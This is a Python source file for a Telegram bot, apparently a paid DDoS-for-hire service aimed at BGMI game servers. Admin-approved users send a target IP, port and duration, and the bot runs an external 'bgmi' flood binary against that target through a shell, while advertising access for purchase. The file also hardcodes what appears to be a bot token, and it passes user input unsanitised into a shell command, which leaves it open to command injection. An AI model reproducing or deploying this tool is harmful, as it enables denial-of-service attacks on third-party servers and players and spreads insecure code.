#bgmiddoserpython

import telebot
import subprocess
import datetime
import os
import time

# Railway/Cloud hosting ke liye keep_alive zaroori hai
try:
    from keep_alive import keep_alive
    keep_alive()
except ImportError:
    pass

# Token aur Admin ID (Updated as per your request)
bot = telebot.TeleBot('8749691844:AAF-YCPj_CsbiFM83vkGQ6kfCW20d6fADFE')
admin_id = ["8787952549"]

USER_FILE = "users.txt"
LOG_FILE = "log.txt"

# Files setup
if not os.path.exists(USER_FILE):
    with open(USER_FILE, "w") as f: f.write("")
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w") as f: f.write("")

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except:
        return []

allowed_user_ids = read_users()

def log_command(user_id, target, port, duration):
    try:
        user_info = bot.get_chat(user_id)
        username = "@" + user_info.username if user_info.username else f"ID: {user_id}"
        with open(LOG_FILE, "a") as file:
            file.write(f"User: {username} | Target: {target} | Port: {port} | Time: {duration}\n")
    except:
        pass

# --- Handlers ---

@bot.message_handler(commands=['add'])
def add_user(message):
    if str(message.chat.id) in admin_id:
        cmd = message.text.split()
        if len(cmd) > 1:
            uid = cmd[1]
            if uid not in allowed_user_ids:
                allowed_user_ids.append(uid)
                with open(USER_FILE, "a") as f: f.write(f"{uid}\n")
                bot.send_message(message.chat.id, f"✅ User {uid} Added!")
            else:
                bot.send_message(message.chat.id, "❌ User already exists.")
    else:
        bot.send_message(message.chat.id, "❌ Only Admin can add users.")

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        cmd = message.text.split()
        if len(cmd) == 4:
            target, port, duration = cmd[1], cmd[2], cmd[3]
            if int(duration) <= 600:
                log_command(user_id, target, port, duration)
                bot.send_message(message.chat.id, f"🚀 ATTACK STARTED!\n\n🎯 Target: {target}\n🔗 Port: {port}\n⏳ Time: {duration}s")
                
                # Binary permission aur execution
                full_command = f"chmod +x bgmi && ./bgmi {target} {port} {duration} 500"
                subprocess.run(full_command, shell=True)
                
                bot.send_message(message.chat.id, f"✅ ATTACK FINISHED\n🎯 Target: {target}")
            else:
                bot.send_message(message.chat.id, "❌ Max time is 600 seconds.")
        else:
            bot.send_message(message.chat.id, "📝 Usage: /bgmi <ip> <port> <time>")
    else:
        bot.send_message(message.chat.id, "🚫 No Access! Contact @SODHI_OWNER")

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, f"❄️ Welcome {message.from_user.first_name}!\n\nUse /help for commands.\nBuy Access: @SODHI_OWNER")

@bot.message_handler(commands=['help'])
def help_cmd(message):
    bot.send_message(message.chat.id, "💥 /bgmi <ip> <port> <time>\n👤 /myinfo\n📜 /rules\n💎 /plan")

@bot.message_handler(commands=['myinfo'])
def myinfo(message):
    uid = str(message.chat.id)
    role = "Admin" if uid in admin_id else "User"
    bot.send_message(message.chat.id, f"Your Info:\nID: {uid}\nRole: {role}")

# --- Polling Fix for Railway ---
if __name__ == "__main__":
    print("Bot is Starting...")
    while True:
        try:
            # skip_pending=True purane failed messages ko ignore karega (Bad Request Fix)
            bot.polling(none_stop=True, skip_pending=True, timeout=60)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)
